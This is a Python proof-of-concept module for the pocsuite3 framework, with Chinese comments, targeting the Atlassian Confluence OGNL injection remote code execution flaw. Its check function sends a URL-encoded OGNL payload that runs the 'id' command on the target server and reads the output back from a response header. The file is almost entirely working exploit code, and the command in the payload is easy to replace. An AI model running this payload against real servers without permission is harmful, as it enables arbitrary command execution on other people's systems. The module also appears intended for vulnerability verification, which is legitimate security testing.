from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class ACrcePOC(POCBase):
    vulID = "1571"  # ssvid ID 
    version = "1"  # 默认为1
    author = "xans"  # PoC作者的大名
    vulDate = "2022-06-03"  # 漏洞公开的时间
    createDate = "2022-10-16"  # 编写 PoC 的日期
    updateDate = "2022-10-16"  # PoC 更新的时间
    references = ["https://www.exploit-db.com/exploits/50952"]  # 漏洞地址来源
    name = "ATLASSIAN-Confluence   rce 远程命令PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "Atlassian"  # 漏洞应用名称
    appVersion = "1.3.0版本至7.4.17之前版本、7.13.0版本至7.13.7之前版本、7.14.0版本至7.14.3之前版本、7.15.0版本至 7.15.2之前版本、7.16.0版本至7.16.4之前版本、7.17.0版本至7.17.4之前版本、7.18.0版本至7.18.1之前版本"  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                Atlassian Confluence Server是澳大利亚Atlassian公司的一套具有企业知识管理功能，并支持用于构建企业WiKi的协同软件的服务器版本。
                Atlassian Confluence Server 和 Data Center 存在注入漏洞。攻击者利用该漏洞执行任意代码。
           """  # 漏洞简要描述
    pocDesc = """
               poc的用法描述
           """  # POC用法描述

    def _check(self):


        full_url = f"{self.url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
        headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"",
                   "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9"}
        result = []
        try:
            response = requests.get(full_url, headers=headers, verify=False, timeout=5, allow_redirects=False)

            if response.status_code == 302 and response.headers['X-Cmd-Response']:
                result.append(self.url)
        except Exception:
            pass
        finally:
            return result


    def _verify(self):
        result = {}
        res = self._check() 
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(ACrcePOC)
